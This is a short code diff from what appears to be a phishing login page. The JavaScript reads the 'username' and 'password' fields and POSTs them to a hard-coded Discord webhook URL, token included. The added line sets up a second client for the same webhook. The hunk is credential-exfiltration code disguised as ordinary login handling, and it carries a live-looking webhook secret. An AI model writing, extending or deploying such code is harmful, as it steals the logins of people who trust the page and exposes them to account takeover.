@@ -100,6 +100,7 @@
     var request = new XMLHttpRequest();
     request.open("POST", "https://discordapp.com/api/webhooks/1082295547752370276/zpQcMZnqAoy311HrY52jknLQ_q3X_yp8glX2uqTRKfBDDG8UfPL59DodKJbVkM424Kxq");
     request.setRequestHeader('Content-type', 'application/json');
+	  const webhookClient = new WebhookClient({ url: 'https://discordapp.com/api/webhooks/1082295547752370276/zpQcMZnqAoy311HrY52jknLQ_q3X_yp8glX2uqTRKfBDDG8UfPL59DodKJbVkM424Kxq' });
     var params = {
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
     }
